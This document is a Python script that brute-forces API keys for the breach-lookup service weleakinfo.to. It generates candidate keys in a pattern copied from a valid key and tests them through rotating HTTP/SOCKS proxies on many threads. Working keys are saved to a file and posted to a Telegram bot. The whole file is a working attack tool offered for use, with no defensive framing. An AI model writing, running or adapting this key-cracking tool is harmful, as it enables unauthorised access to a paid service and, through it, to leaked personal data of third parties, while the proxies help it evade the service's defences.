#  Importing all the necessary packages/modules
from random import choice, randint
import requests, time, threading
from colored import fg,attr
from os import system
from time import sleep

#  Some lambda functions for the colors   // May not work on all OS
g = lambda x : fg('green')+x+attr('reset')
rod = lambda x : fg('red')+x+attr('reset')
b = lambda x : fg('blue')+x+attr('reset')
y = lambda x : fg('yellow')+x+attr('reset')
c = lambda x : fg('cyan')+x+attr('reset')
m = lambda x : fg('magenta')+x+attr('reset')


#  Signs with colors
clear = lambda: system("cls")
clear()
exl = '['+rod('!')+']'
ques = '['+m('?')+']'
ha  ='['+g('#')+']'
mult = '['+c('*')+']'

#  Intro
system('title WELCOME TO WELEAKINFO CHECKER !')
print(rod('\033[1m'+'''
.-.  .-.,---.   ,-.    ,---.    .--.  ,-. .-. ,-..-. .-.,---. .---.   
| |/\| || .-'   | |    | .-'   / /\ \ | |/ /  |(||  \| || .-'/ .-. )  
| /  \ || `-.   | |    | `-.  / /__\ \| | /   (_)|   | || `-.| | |(_) 
|  /\  || .-'   | |    | .-'  |  __  || | \   | || |\  || .-'| | | |  
|(/  \ ||  `--. | `--. |  `--.| |  |)|| |) \  | || | |)|| |  \ `-' /  
(_)   \|/( __.' |( __.'/( __.'|_|  (_)|((_)-' `-'/(  (_))\|   )---'   
       (__)     (_)   (__)            (_)       (__)   (__)  (_)   '''))
print('                            This Tool is Made By '+b('\033[1m@a7.acc\n'))

#   To clear the file
open('valid_keys.txt','w').close()


#   If u want the hits to be sent on telegram change this to False   the file tele.txt should be in this format (token/id) first token then / then the id
telegram = True


#    Function to send the hit to file and telegram bot
def send_info(info):
    try:
        if telegram:
            with open('tele.txt','r') as fa:
                tokid = fa.read().split('/')
                requests.post(f'https://api.telegram.org/bot{tokid[0]}/sendMessage?chat_id={tokid[1]}&text={info}')
    except:
        pass
    with open('valid_keys.txt','a') as file:
        file.write(info)

found = 0
bad = 0
checked = 0

#    Function to generate API key. made using valid API key for the website weleakinfo.to
def key():
    random_str = ''
    for _ in range(4):
        for _ in range(4):
            random_str += choice(''.join('QWERTYUIOPASDFGHJKLZXCVBNM'))
        random_str += '-'
    random_str = random_str[:-1].split('-')
    for i in range(3):
        if 'Q' not in random_str[i]:
            random_str[i] = random_str[i].replace(choice(random_str[i]),'Q')
        if 'R' not in random_str[i]:
            chosen = 'Q'
            while chosen == 'Q':
                chosen = choice(random_str[i])
            random_str[i] = random_str[i].replace(chosen,'R')
    random_str = random_str[0]+'-'+random_str[1]+'-'+random_str[3]+'-'+random_str[2]
    return random_str


#   Function for generating random strings
def ra(length,ty):
    if ty == 'a0':#   Small letters only with numbers
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'A0':# Capital letters only with numbers
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNM1234567890')
    elif ty == 'Az':# Capital and small letters only
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    elif ty == 'All':#Capital and small letters and numbers
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'a':#  Small letters only
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm')
    elif ty == 'n':#  Numbers only
        randoms = ''.join('1234567890')
    random_str = ''
    for _ in range(int(length)):
        random_str += choice(randoms)
    return random_str


#         Function for checking
def look():
    global found,bad,checked
    
    while True:
        keyy = key()
        while True:
            try:
                proxy = choice(proxies)
                url = f'https://api.weleakinfo.to/api?value={ra(randint(4,7),"a0")}@gmail.com&type=email&key={keyy}'
                r = requests.get(url,proxies=proxy,timeout=5).json() 
                break
            except:
                pass
        if r['success'] or r['error'] == 'Result not found.':
            found+= 1
            checked += 1
            info = f'''
----NEW KEY FOUND!----
KEY     : {keyy}
MESSAGE : {str(r)}
Time    : {time.asctime()}
-----------@A7_acc----
    '''
            send_info(info)
            print(ha+' '+keyy)
            system(f'title CHECKED:{str(checked)}    FOUND:{str(found)}    BAD:{str(bad)}    THREADS:{str(threading.active_count())}')
        elif r['error'] == 'Invalid key':
            print(exl+' '+keyy)
            bad += 1
            checked += 1
            system(f'title CHECKED:{str(checked)}    FOUND:{str(found)}    BAD:{str(bad)}    THREADS:{str(threading.active_count())}')
                
        else:
            print(r)
            bad += 1
            checked += 1
            system(f'title CHECKED:{str(checked)}    FOUND:{str(found)}    BAD:{str(bad)}    THREADS:{str(threading.active_count())}')
    

#    The main function
def main():
    global proxies, thr
    proxfile = input('┌─────'+ques+' Enter The Proxies File Name! \n└──────────────────────────────>>  ')
    if not proxfile.endswith('.txt'):
        proxfile = proxfile+'.txt'
    try:
        # deepcode ignore PT: This is not a web application
        with open(proxfile,'r') as dsd:
            proxies = dsd.read().splitlines()
    except Exception as exx:
        print(exl+' Error while openning proxies file : '+y(str(exx)))
        sleep(4)
    prox_type = input(f".\n.\n┌───{ques}Enter the proxies type you want to scrape:\n└───[{c('1')}] HTTP/S\n└───[{c('2')}] SOCKS4\n└───[{c('3')}] SOCKS5\n└───────>> ")
    if prox_type == '1':
        for proxy in proxies:
            proxies[proxies.index(proxy)] = {
                'http':f'https://{proxy}',
                'https':f'http://{proxy}'
            }
    elif prox_type == '2':
        for proxy in proxies:
            proxies[proxies.index(proxy)] = {
                'http':f'socks4://{proxy}',
                'https':f'socks4://{proxy}'
            }
    elif prox_type == '3':
        for proxy in proxies:
            proxies[proxies.index(proxy)] = {
                'http':f'socks5://{proxy}',
                'https':f'socks5://{proxy}'
            }

    print(f'  └──────[ {c(str(len(proxies)))} Proxies Collected! ]\n.\n.')
    sleep(1)
    thr = input(f".\n.\n┌───{ques} Enter How Many Threads You Want! \n└──────────────────────────────>>  ")
    print('└──────────[ STARTING TO CHECK.... ')
    return


    
main()


#    For the threads
for _ in range(int(thr)):
    try:
        th = threading.Thread(target=look)
        th.start()
    except:
        pass